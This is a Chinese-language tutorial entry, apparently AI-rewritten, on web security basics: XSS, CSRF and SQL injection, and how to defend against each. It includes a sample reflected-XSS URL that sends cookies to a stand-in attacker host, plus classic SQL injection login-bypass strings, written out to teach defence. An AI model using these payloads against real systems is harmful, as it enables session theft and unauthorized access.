---
id: "web-security"
concept: "Web安全基础"
domain: "ai-engineering"
subdomain: "web-backend"
subdomain_name: "Web后端"
difficulty: 4
is_milestone: false
tags: ["security", "xss", "csrf", "injection"]

# Quality Metadata (Schema v2)
content_version: 2
quality_tier: "B"
quality_score: 45.9
generation_method: "ai-rewrite-v1"
unique_content_ratio: 0.452
last_scored: "2026-03-22"
sources:
  - type: "ai-generated"
    model: "claude-sonnet-4-20250514"
    prompt_version: "ai-rewrite-v1"
scorer_version: "scorer-v2.0"
quality_method: intranet-llm-rewrite-v2
updated_at: 2026-03-26
---

# Web安全基础

## 概述

Web安全基础涵盖针对Web应用程序最常见的攻击向量及其对应防御机制，核心包括XSS（跨站脚本攻击）、CSRF（跨站请求伪造）和SQL注入三大类。这三类攻击在OWASP（开放式Web应用安全项目）发布的"Top 10"威胁榜单中长期占据前列位置，SQL注入自2010年起连续多年排名第一，直到2021年版本才被"权限访问控制失效"取代，但SQL注入仍位列第三。理解这些攻击需要从攻击者视角出发，分析数据如何从不可信输入变为可执行代码或越权操作。

Web安全问题的根源在于：Web应用必须接受来自不可信客户端的输入，并在服务端、浏览器端或数据库端处理这些输入。XSS利用的是浏览器对HTML/JavaScript的解析机制；CSRF利用的是浏览器自动携带Cookie的特性（与Session和Cookie的工作原理直接相关）；SQL注入利用的是数据库查询语言的动态拼接特性。三类攻击虽然目标各异，但防御思路均指向同一原则：严格区分数据与指令。

## 核心原理

### XSS（跨站脚本攻击）

XSS分为三种类型：**反射型（Reflected）**、**存储型（Stored）**和**DOM型**。反射型XSS将恶意脚本嵌入URL参数，服务端将其原样反射到响应HTML中；存储型XSS将脚本持久化到数据库，每次页面渲染时触发；DOM型XSS完全在客户端执行，不经过服务端，通过修改DOM环境实现攻击。

典型的反射型XSS载荷形如：
```
https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```
防御XSS的核心手段是**输出编码（Output Encoding）**，而非仅仅过滤输入。对于HTML上下文，需将`<`编码为`&lt;`，`>`编码为`&gt;`，`"`编码为`&quot;`，`'`编码为`&#x27;`。此外，HTTP响应头`Content-Security-Policy`（CSP）可声明合法脚本来源，形如`Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com`，从浏览器层面阻断恶意脚本执行。Cookie设置`HttpOnly`属性后，JavaScript无法通过`document.cookie`读取，可有效缓解Cookie窃取类XSS的危害。

### CSRF（跨站请求伪造）

CSRF攻击利用浏览器在发送跨域请求时会自动携带目标站Cookie的机制。攻击者诱导已登录用户访问恶意页面，该页面向目标站发起带有合法Cookie的伪造请求，服务端无法区分请求来源。

防御CSRF最主流的方案是**Synchronizer Token Pattern（同步令牌模式）**：服务端为每个会话生成一个随机CSRF Token（如32字节的加密随机数），将其嵌入表单隐藏字段，提交时服务端验证Token与Session绑定关系。另一种方案是**Double Submit Cookie**：将Token同时存入Cookie和请求参数，服务端校验两者是否一致。HTTP头`SameSite=Strict`或`SameSite=Lax`属性可直接阻止跨站请求携带Cookie，是现代浏览器（Chrome 80+起默认设置为`Lax`）提供的原生防御层。需要注意：基于JWT的无状态API（通过`Authorization: Bearer`头传递Token而非Cookie）天然免疫CSRF，因为浏览器不会自动添加`Authorization`头。

### SQL注入

SQL注入的根本原因是将用户输入直接拼接进SQL字符串。经典案例：
```sql
-- 危险写法
SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
-- 攻击者输入 username = admin' --
-- 实际执行：SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```
通过`--`注释符绕过密码验证，`' OR '1'='1`可实现万能密码登录，`UNION SELECT`可提取其他表数据。

防御SQL注入的**唯一可靠方案**是使用**参数化查询（Parameterized Queries）**，也称预编译语句（Prepared Statements）：
```python
# Python示例（使用psycopg2）
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```
参数化查询让数据库驱动在编译SQL结构后再绑定数据，数据中的特殊字符永远不会被解析为SQL语法。ORM框架（如SQLAlchemy、Django ORM）默认使用参数化查询，但直接调用`.execute(raw_sql)`方法并手动拼接时仍会引入风险。

## 实际应用

在AI工程的Web后端场景中，**模型API接口**是高风险区域。若将用户输入的Prompt直接拼接进数据库查询以记录日志，存在SQL注入风险；若将AI生成的HTML内容直接渲染到前端页面，存在存储型XSS风险（攻击者可能通过Prompt注入诱导模型输出恶意脚本）。

Django框架内置了针对上述三类攻击的防御：模板引擎默认转义HTML特殊字符防XSS；`CsrfViewMiddleware`中间件为每个POST请求验证CSRF Token；ORM层使用参数化查询防SQL注入。但当开发者使用`mark_safe()`、`{% autoescape off %}`或`.raw()`时，这些保护会被显式绕过，需要格外审查。

在HTTP安全头配置上，生产环境应至少设置：`X-Content-Type-Options: nosniff`（防止MIME嗅探型XSS）、`X-Frame-Options: DENY`（防止点击劫持）、`Strict-Transport-Security: max-age=31536000`（强制HTTPS，防止Cookie被中间人截获）。

## 常见误区

**误区一：输入过滤（Input Filtering）可以代替输出编码防XSS。** 很多开发者试图过滤`<script>`标签，但攻击者可以用`<img onerror="...">`、`javascript:alert(1)`形式的URL或SVG文件绕过。XSS防御必须在输出阶段针对具体上下文（HTML、JavaScript、CSS、URL）分别编码，仅在输入端过滤无法覆盖所有绕过路径。

**误区二：HTTPS可以防止CSRF。** HTTPS加密传输内容，但浏览器在HTTPS站点下同样会自动携带Cookie发送跨域请求。CSRF Token或SameSite属性才是对抗CSRF的直接手段，两者解决的是不同层面的问题。

**误区三：ORM框架使用后无需担心SQL注入。** Django ORM的`filter(name=user_input)`是安全的，但`MyModel.objects.extra(where=["name = '%s'" % user_input])`或`cursor.execute("SELECT... WHERE name = '%s'" % user_input)`仍然是危险的字符串拼接。使用ORM并不等于免疫SQL注入，凡是绕过ORM直接构建SQL字符串的地方都需要重新审查。

## 知识关联

本文涉及的CSRF防御与**Session和Cookie**的工作机制直接绑定：CSRF之所以有效，是因为Cookie的自动携带特性；SameSite属性和CSRF Token都是对Cookie行为的约束或补充验证。理解Cookie的`Domain`、`Path`、`Secure`、`HttpOnly`、`SameSite`五个属性，是理解CSRF攻击面的前提。

与**API认证（JWT/OAuth）**的关联体现在：JWT存储于`localStorage`时不受CSRF攻击，但会暴露于XSS攻击（JavaScript可读取`localStorage`）；存储于`HttpOnly Cookie`时对XSS免疫，但又需要处理CSRF。这个存储位置的权衡是JWT实现中的经典安全决策。后续学习**OAuth与OIDC**时，会在此基础上进一步涉及授权码（Authorization Code）流程中的`state`参数——该参数本质上是防CSRF Token在OAuth场景下的具体应用，用于防止授权码劫持攻击（Authorization Code Interception Attack）。